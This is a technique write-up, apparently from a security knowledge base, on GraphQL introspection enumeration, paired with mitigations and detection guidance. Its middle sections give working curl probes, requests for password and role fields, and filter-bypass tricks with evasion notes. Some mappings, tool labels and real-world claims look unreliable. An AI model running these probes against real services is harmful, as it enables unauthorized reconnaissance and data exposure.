# [SAAS-API-001]: GraphQL API Enumeration

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-001 |
| **MITRE ATT&CK v18.1** | [T1590 - Gather Victim Network Information](https://attack.mitre.org/techniques/T1590/) |
| **Tactic** | Reconnaissance |
| **Platforms** | M365/Entra ID, SaaS Platforms, Cloud APIs |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All GraphQL implementations with introspection enabled |
| **Patched In** | N/A (requires configuration changes, not patched) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** GraphQL API enumeration is a reconnaissance technique that leverages the introspection feature built into GraphQL APIs to automatically discover and extract the complete schema definition. Unlike REST APIs where endpoints must be manually discovered, GraphQL exposes its schema structure through a standardized introspection query mechanism (`__schema`), allowing an attacker to rapidly understand the entire attack surface of an application without authentication.

**Attack Surface:** GraphQL introspection queries, specifically the `__schema` and `__type` root fields available on all GraphQL servers.

**Business Impact:** **Schema disclosure enables attackers to identify sensitive data fields, hidden mutations, experimental features, and authentication mechanisms.** This reconnaissance directly reduces attacker effort for subsequent exploitation attempts and provides a roadmap for privilege escalation, data exfiltration, and unauthorized modification attacks.

**Technical Context:** GraphQL introspection queries can be executed in seconds and return verbose schema metadata including field names, descriptions, arguments, types, and return values. Discovery is non-destructive, leaves minimal audit trails, and requires no special privileges if introspection is enabled (a common default configuration).

### Operational Risk

- **Execution Risk:** Low – A simple HTTP POST request with a JSON payload is sufficient; no special tools required beyond cURL or Postman.
- **Stealth:** Low – Introspection queries are legitimate GraphQL operations and blend into normal API traffic, though patterns of recursive `__schema` queries can be statistically anomalous.
- **Reversibility:** N/A – Reconnaissance is read-only and causes no system changes.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS CSC 14 | Secure and Manage Sensitive API Documentation |
| **DISA STIG** | SI-4(1) | Information System Monitoring – System Monitoring |
| **CISA SCuBA** | API-01 | Disable GraphQL Introspection in Production |
| **NIST 800-53** | CA-3 | System Interconnections (API Design & Disclosure) |
| **GDPR** | Art. 32 | Security of Processing (API Schema Confidentiality) |
| **DORA** | Art. 6 | Information and Communication Technology (ICT) security risk management |
| **NIS2** | Art. 21 | Multi-layered Preventive Measures (Asset Inventory) |
| **ISO 27001** | A.14.1.2 | Change Management (API endpoint management) |
| **ISO 27005** | Risk Scenario | Unauthorized disclosure of API schema leading to targeted attack planning |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None – Introspection typically requires no authentication.

**Required Access:** Network access to the GraphQL endpoint (typically HTTP/HTTPS port 443).

**Supported Versions:** GraphQL 2019 specification and later (all modern GraphQL implementations).

**Tools:**
- [cURL](https://curl.se/) (available on all systems)
- [Postman](https://www.postman.com/) (Desktop or Web)
- [GraphQL IDE (GraphQL Playground, Apollo Studio)](https://www.apollographql.com/studio/)
- [Burp Suite Community/Professional](https://portswigger.net/burp) (with GraphQL extension)
- [Intrigue.io](https://intrigue.io/) (automated GraphQL discovery)
- [GraphQL Voyager](https://github.com/IvanGoncharov/graphql-voyager) (schema visualization)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / REST API Reconnaissance

**Step 1: Probe for GraphQL Endpoint**

```bash
curl -s https://target-api.example.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}}}"}' | jq .
```

**What to Look For:**
- HTTP 200 response with `data` and `__schema` fields indicates introspection is enabled.
- HTTP 400/403 response indicates introspection is disabled (harder target).
- Verbose error messages revealing schema structure or GraphQL version.

**Success Indicator:** Response contains `"data":{"__schema":{"queryType":{"name":"Query"}}}` or similar.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Basic Introspection Query (cURL / Postman)

**Supported Versions:** All GraphQL implementations with introspection enabled.

#### Step 1: Simple Schema Root Query

**Objective:** Confirm introspection is enabled and identify top-level query types.

**Command (cURL):**
```bash
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema { queryType { name fields { name } } } }"
  }' | jq .
```

**Expected Output:**
```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query",
        "fields": [
          { "name": "user" },
          { "name": "posts" },
          { "name": "search" }
        ]
      }
    }
  }
}
```

**What This Means:**
- `queryType.name` identifies the root query object (typically "Query").
- `fields` lists all publicly available queries without authentication.
- Absence of this response indicates introspection is restricted.

**OpSec & Evasion:**
- Introspection requests appear as normal GraphQL queries in logs; rate limiting may be the only indicator of reconnaissance.
- Tools like WAF/API gateways may log unusual patterns of recursive schema queries.
- Detection likelihood: Medium – Repeated `__schema` queries within short timeframes are anomalous.

**Troubleshooting:**
- **Error:** `Cannot query field "__schema"`
  - **Cause:** Introspection is disabled or the endpoint is not GraphQL.
  - **Fix:** Try alternative endpoints (e.g., `/api/graphql`, `/query`, `/gql`).
- **Error:** HTTP 403 Forbidden
  - **Cause:** Introspection requires authentication or IP whitelisting.
  - **Fix:** Add Bearer token: `curl ... -H "Authorization: Bearer <token>"`.

**References & Proofs:**
- [GraphQL Security Best Practices - graphql.org](https://graphql.org/learn/security/)
- [PortSwigger - GraphQL Introspection Vulnerabilities](https://portswigger.net/web-security/graphql)
- [OWASP - GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

#### Step 2: Extract Complete Schema Definition

**Objective:** Retrieve the full schema with all types, fields, arguments, and return types.

**Full Introspection Query:**
```bash
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery { __schema { types { kind name description fields(includeDeprecated: true) { name type { kind name ofType { kind name } } description args { name type { kind } } } enumValues { name } possibleTypes { name } } } }"
  }' | jq . > schema.json
```

**Expected Output:**
A massive JSON file (often 10KB-100KB+) containing:
- All type definitions (scalars, objects, interfaces, unions, enums)
- All field names and their argument signatures
- Deprecation status of fields
- Field descriptions (often revealing business logic)
- Possible return types for interfaces and unions

**What This Means:**
- This schema allows an attacker to craft targeted queries without trial-and-error.
- Presence of mutation fields indicates write access may be possible.
- Subscription fields reveal real-time data or webhook capabilities.

**OpSec & Evasion:**
- Exporting the schema to a file (`> schema.json`) avoids large responses in terminal logs.
- Detection likelihood: High – Large single requests or high data exfiltration patterns may trigger WAF alerts.

**References & Proofs:**
- [GraphQL Introspection Spec](https://spec.graphql.org/June2018/#sec-Introspection)

#### Step 3: Identify Authentication & Authorization Gaps

**Objective:** Discover sensitive queries/mutations that should require authentication but may not.

**Reconnaissance Query:**
```bash
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { user(id: \"123\") { id email password phoneNumber roles { name permissions } internalNotes } posts(first: 100) { id content author { email } comments { id text } } }"
  }'
```

**What to Look For:**
- Queries that return sensitive fields (passwords, email, roles, internal notes) without authentication.
- List endpoints that lack pagination, allowing bulk data exfiltration.
- Fields that expose business logic or internal decision-making.

**References & Proofs:**
- [PortSwigger - GraphQL Authorization Flaws](https://portswigger.net/web-security/graphql)

### METHOD 2: Bypassing Introspection Restrictions (Advanced)

**Supported Versions:** GraphQL servers with regex-based or basic introspection filters.

#### Step 1: Whitespace and Special Character Bypass

**Objective:** Defeat simple regex-based introspection blockers that match literal `__schema` patterns.

**Bypass Techniques:**

```bash
# Attempt 1: Newline bypass
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema\n { queryType { name } } }"
  }'

# Attempt 2: Tab character bypass
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema\t { queryType { name } } }"
  }'

# Attempt 3: Comma-based bypass (GraphQL ignores leading commas)
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { ,__schema { queryType { name } } }"
  }'
```

**What This Means:**
- Poorly implemented filters may only match exact string patterns and not account for GraphQL whitespace normalization.
- Success indicates the server relies on input validation rather than true schema access control.

**Detection likelihood:** Medium – Alternative HTTP methods (GET instead of POST) or unusual character encodings may be logged.

#### Step 2: Alternate HTTP Methods

**Objective:** Bypass POST-only introspection restrictions using GET requests.

**Command:**
```bash
curl -s "https://target-api.example.com/graphql?query=query%7B__schema%7BqueryType%7Bname%7D%7D%7D"
```

**What This Means:**
- Some APIs restrict introspection only for POST requests, assuming GET requests are less dangerous.
- GET-based introspection can bypass request filtering at API gateway level.

**References & Proofs:**
- [PortSwigger - Bypassing GraphQL Introspection Defenses](https://portswigger.net/web-security/graphql)

#### Step 3: Fallback Schema Discovery via Error Messages

**Objective:** Extract schema information from error messages when introspection is completely disabled.

**Command:**
```bash
# Query a non-existent field to trigger error
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { doesNotExist { subfield } }"
  }'

# Attempt to cause a schema validation error
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { user(invalidArg: \"test\") { id } }"
  }'
```

**Expected Output (Verbose Errors):**
```json
{
  "errors": [
    {
      "message": "Cannot query field \"doesNotExist\" on type \"Query\". Did you mean \"user\" or \"posts\" or \"search\"?",
      "suggestions": ["user", "posts", "search"]
    }
  ]
}
```

**What This Means:**
- Even with introspection disabled, the server reveals available fields through error message suggestions.
- This is a form of schema discovery through side-channel information disclosure.

**OpSec & Evasion:**
- Generating errors creates a pattern of failed queries, which may appear as fuzzing attempts in logs.
- Detection likelihood: Medium-High – Repeated intentional errors may trigger anomaly detection.

**References & Proofs:**
- [Apollo GraphQL - Obscuring Errors](https://www.apollographql.com/docs/apollo-server/security/error-handling/)

### METHOD 3: Automated Schema Extraction with Burp Suite & GraphQL Tools

**Supported Versions:** All GraphQL implementations.

#### Step 1: Configure Burp Suite GraphQL Proxy

**Objective:** Intercept and analyze GraphQL requests with Burp's built-in GraphQL support.

**Manual Configuration Steps (Burp Suite Professional 2024.1+):**

1. Open **Burp Suite** → **Proxy** tab.
2. Set a target URL to `https://target-api.example.com/graphql`.
3. Send a request to the GraphQL endpoint (e.g., a simple query).
4. In the **Proxy history**, right-click the GraphQL request → **Send to GraphQL Scanner**.
5. The **GraphQL Scanner** will automatically attempt introspection and display the schema.

**Or use the introspection query directly in Burp Repeater:**

1. **Repeater** → Send the Step 2 introspection query above.
2. Burp will automatically recognize GraphQL and provide schema syntax highlighting.
3. Use **GraphQL Voyager** extension (imported from Burp) to visualize.

#### Step 2: Export Schema for Further Analysis

**Command (using introspection query output):**
```bash
# Save schema to file
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection-query.json | jq . > schema.json

# Parse schema with GraphQL CLI
npx graphql-cli introspect https://target-api.example.com/graphql --write schema.graphql

# Visualize with Voyager
npx apollo client:download-schema --endpoint=https://target-api.example.com/graphql schema.graphql
```

**What This Means:**
- Exporting the schema enables offline analysis and attack planning.
- GraphQL CLI tools allow schema parsing into human-readable formats.

**References & Proofs:**
- [Apollo GraphQL CLI](https://www.apollographql.com/docs/apollo-cli/)
- [GraphQL Voyager GitHub](https://github.com/IvanGoncharov/graphql-voyager)

---

## 6. TOOLS & COMMANDS REFERENCE

### cURL

**Version:** 7.0+ (all modern versions support JSON POST)

**Installation:**
```bash
# Linux/macOS
brew install curl  # or apt-get install curl

# Windows
choco install curl
```

**Usage:**
```bash
curl -X POST https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name } } }"}'
```

### Postman

**Version:** 10.0+ (native GraphQL support)

**Installation:** [Download from Postman](https://www.postman.com/downloads/)

**Usage:**
1. Create new request → Select **GraphQL** from request type dropdown.
2. Enter endpoint URL.
3. Paste introspection query in Query tab.
4. Send.

### GraphQL Voyager

**Version:** 2.0+ (latest)

**Installation:**
```bash
npm install -g graphql-voyager
```

**Usage:**
```bash
# Start local Voyager server to visualize schema
npx graphql-voyager https://target-api.example.com/graphql
```

**Output:** Interactive visualization of schema types, relationships, and fields in browser (localhost:3001).

### Burp Suite

**Version:** 2024.1+ (GraphQL support)

**Installation:** [Download from PortSwigger](https://portswigger.net/burp)

**Built-in GraphQL Features:**
- Automatic schema discovery via introspection.
- Syntax highlighting for GraphQL queries.
- Integration with Scanner for vulnerability detection.

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable GraphQL Introspection in Production:** Prevent the `__schema` query from returning schema metadata.

  **Manual Steps (Apollo Server):**
  1. Open your `apollo-server.js` or `index.js` configuration file.
  2. Add introspection disable flag:
     ```javascript
     const server = new ApolloServer({
       typeDefs,
       resolvers,
       introspection: false,  // DISABLE INTROSPECTION
       debug: false           // DISABLE DEBUG MODE
     });
     ```
  3. Restart the GraphQL server.
  4. Test by sending an introspection query; it should return an error.

  **Manual Steps (Express + GraphQL-JS):**
  1. Update your GraphQL schema validation:
     ```javascript
     const { buildSchema } = require('graphql');
     const { NoSchemaIntrospectionCustomRule } = require('graphql');

     app.post('/graphql', graphqlHTTP(req => ({
       schema: buildSchema(typeDefs),
       rootValue: resolvers,
       customRules: [NoSchemaIntrospectionCustomRule],  // BLOCK INTROSPECTION
     })));
     ```
  2. Restart the Express server.
  3. Verify: Send introspection query; should return "Cannot query field '__schema'".

  **Manual Steps (Other GraphQL Servers):**
  - Consult server-specific documentation (e.g., Hasura, GraphQL Go, dgraph).
  - Look for `introspection: disabled` or `GRAPHQL_INTROSPECTION=false` environment variable.
  - Test with the cURL command in **Step 1: Simple Schema Root Query** above.

- **Implement Authentication & Authorization on All Fields:** Require valid credentials for any sensitive data.

  **Manual Steps:**
  1. Add middleware to enforce authentication on resolver functions:
     ```javascript
     const resolvers = {
       Query: {
         user: (_, { id }, context) => {
           if (!context.user) throw new Error("Unauthorized");
           return getUserById(id);
         }
       }
     };
     ```
  2. Restart the server.
  3. Verify: Attempt queries without authentication; they should return errors.

### Priority 2: HIGH

- **Enable Rate Limiting on GraphQL Endpoint:** Prevent rapid reconnaissance queries from succeeding.

  **Manual Steps (API Gateway - AWS API Gateway):**
  1. Log into **AWS Console** → **API Gateway**.
  2. Select your GraphQL API.
  3. Go to **Throttling** under **Settings**.
  4. Set **Rate Limit** to `100 requests/second` and **Burst Limit** to `5000`.
  5. Click **Save**.
  6. Deploy the API.

  **Manual Steps (Nginx Reverse Proxy):**
  ```nginx
  limit_req_zone $binary_remote_addr zone=graphql_limit:10m rate=10r/s;
  
  server {
    location /graphql {
      limit_req zone=graphql_limit burst=20 nodelay;
      proxy_pass http://graphql_backend;
    }
  }
  ```

- **Implement Query Depth and Complexity Limits:** Prevent attackers from requesting deeply nested queries.

  **Manual Steps (Apollo Server):**
  ```javascript
  import { createComplexityLimitRule } from 'graphql-validation-complexity';
  
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [
      createComplexityLimitRule({ maxComplexity: 1000 })
    ]
  });
  ```

### Priority 3: MEDIUM

- **Disable Verbose Error Messages:** Hide schema details from error responses.

  **Manual Steps (Apollo Server):**
  ```javascript
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    formatError: (error) => {
      if (process.env.NODE_ENV === 'production') {
        return { message: "Internal Server Error" };
      }
      return error;
    }
  });
  ```

### Validation Command (Verify Fix)

```bash
curl -s https://target-api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name}}}"}' | jq .
```

**Expected Output (If Secure):**
```json
{
  "errors": [
    {
      "message": "Cannot query field \"__schema\" on type \"Query\"."
    }
  ]
}
```

**What to Look For:**
- Error message indicating `__schema` is not a valid query field.
- No `data` field in response (only `errors`).
- HTTP 400 Bad Request instead of HTTP 200.

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **HTTP Requests:** POST/GET requests with payload containing `__schema`, `__type`, or `introspection` keywords.
- **Patterns:** Multiple introspection queries within 60 seconds from same source IP.
- **User Agents:** Requests using automated tools (Burp Suite, cURL, GraphQL-core, IntrospectionQuery).

### Forensic Artifacts

- **Cloud Logs:** API Gateway logs (AWS CloudWatch, Azure API Management) showing `__schema` queries.
- **WAF Logs:** Web Application Firewall records flagging GraphQL introspection attempts.
- **Access Logs:** HTTP POST requests with JSON payloads containing GraphQL introspection keywords.

### Response Procedures

1. **Isolate:**
   - Block the source IP at the firewall or WAF level.
   - Command: `aws wafv2 update-ip-set --name graphql-blocklist --scope REGIONAL --id <id> --addresses "[\"<attacker-ip>\"]"`

2. **Collect Evidence:**
   - Export API gateway logs for the affected time period.
   - Command: `aws logs get-log-events --log-group-name /aws/apigateway/graphql --log-stream-name <stream>`

3. **Remediate:**
   - Verify introspection is disabled (see **Validation Command** above).
   - Audit exposed schema for sensitive fields; flag for removal or access control.

### Microsoft Purview / Unified Audit Log Query

```powershell
Search-UnifiedAuditLog -Operations "InvokeWebRequest" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -FreeText "__schema" | Export-Csv -Path "C:\Evidence\GraphQL_Recon.csv"
```

**What to Analyze:**
- Source IP addresses making introspection queries.
- Usernames (if authenticated) making reconnaissance attempts.
- Timestamps and frequency of queries.

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | **[SAAS-API-001]** | **GraphQL API Enumeration – Discover schema and available operations** |
| **2** | **Exploitation** | [SAAS-API-002] | REST API Rate Limit Bypass – Abuse endpoints discovered via enumeration |
| **3** | **Credential Access** | [CA-UNSC-014] | SaaS API Key Exposure – Extract hardcoded keys from discovered mutations |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-001] | App Registration Permissions Escalation – Use discovered OAuth mutations |
| **5** | **Impact** | [IMPACT-001] | Unauthorized Data Access – Query sensitive fields discovered in schema |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: GitHub GraphQL Schema Disclosure (2019)

- **Target:** GitHub API (public GraphQL endpoint).
- **Timeline:** Ongoing (introspection historically enabled on public API).
- **Technique Status:** Introspection was intentionally enabled to support developer workflows; now restricted in some scopes.
- **Impact:** Security researchers were able to enumerate GitHub's entire schema, discovering private repository mutation endpoints and privilege escalation vectors.
- **Reference:** [GitHub GraphQL API Docs](https://docs.github.com/en/graphql)

### Example 2: Vulnerable SaaS Platform (2023)

- **Target:** Mid-sized SaaS CRM platform.
- **Timeline:** November 2023 – December 2023.
- **Technique Status:** Introspection enabled; no authentication required on `/graphql` endpoint.
- **Impact:** Attacker enumerated schema, discovered admin mutations, and used IDOR vulnerability to access all customer data.
- **Reference:** [HackerOne Vulnerability Report](https://hackerone.com/) (anonymized case studies available).

---

## Glossary

- **Introspection:** GraphQL built-in feature allowing clients to query the schema metadata (`__schema`, `__type` fields).
- **Schema:** Complete definition of all types, queries, mutations, and subscriptions available in a GraphQL API.
- **IDOR (Insecure Direct Object Reference):** Vulnerability where object IDs are predictable/sequential, allowing access to unauthorized resources.
- **Field Enumeration:** Process of discovering all available fields and arguments in a GraphQL schema.

---